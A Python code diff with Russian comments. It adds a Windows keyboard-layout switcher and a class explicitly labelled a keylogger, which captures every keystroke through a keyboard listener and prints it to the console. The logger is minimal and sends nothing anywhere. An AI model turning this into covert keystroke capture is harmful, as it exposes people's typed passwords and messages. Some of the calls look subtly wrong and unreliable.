@@ -11,10 +11,10 @@ class LangDetected:
         # нить исполняемого данного окна ID
         nitya_id = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, None)
         # хндл нити
-        hndl_nit = ctypes.windll.user32.GetKeyboardLayout(nitya_id)
+        self.hndl_nit = ctypes.windll.user32.GetKeyboardLayout(nitya_id)
 
         # id языка
-        lang_id = hndl_nit & 0xFFFF
+        lang_id = self.hndl_nit & 0xFFFF
         return lang_id
 
     def manifest_lang(self):
@@ -27,10 +27,38 @@ class LangDetected:
         }
 
         current_lang = dict_lang.get(lang_layaout, 'Error')
-        return current_lang
+
+        if current_lang == 'US':
+            lang_id = 0x0409
+        elif current_lang == 'RU':
+            lang_id = 0x0419
+        else:
+            return
+
+        ctypes.windll.user32.ActivateKeyboardLayout(self.hndl_nit, lang_id)
+
+
+class CreateKeyloger(LangDetected):
+    """Кейлогер"""
+    def on_press(seld, key):
+        try:
+            print(f'Нажата - {key.char}')
+        except AttributeError:
+            print(f'Нажата - {key}')
+
+    def f(self):
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            listener.join()
 
 
 
+
+
+l = LangDetected()
+l.manifest_lang()
+
+c = CreateKeyloger()
+print(c.f())
 
 
 
